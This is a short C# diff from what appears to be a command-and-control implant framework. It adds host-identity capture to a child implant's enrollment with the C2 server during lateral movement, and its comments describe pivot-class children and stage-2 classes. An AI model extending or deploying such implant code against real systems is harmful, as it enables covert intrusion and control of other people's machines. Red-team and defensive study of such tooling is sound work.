@@ -59,9 +59,11 @@ internal static class Lateral
             // parent and forwarding the requested class so a non-default class is
             // honored instead of silently defaulting to stage-2. The server
             // resolves and scope-checks the parent before recording the linkage
-            // (architecture.md Sec 10.1).
+            // (architecture.md Sec 10.1). The child reports this machine's host
+            // facts: the enroll happens in this implant's process, so the child's
+            // device identity is the host it was derived on.
             var enrolled = await C2.EnrollAsync(
-                enroll.Url, token, enroll.ParentId, childKey, enroll.CAs, enroll.Profile, requestedClass);
+                enroll.Url, token, enroll.ParentId, childKey, enroll.CAs, enroll.Profile, requestedClass, HostIdentity.Capture());
             // A Pivot-class child has no process of its own (architecture.md
             // Sec 5.2): its tasking will arrive on this implant's stream marked
             // with the child's id, and the fronting gate accepts only children
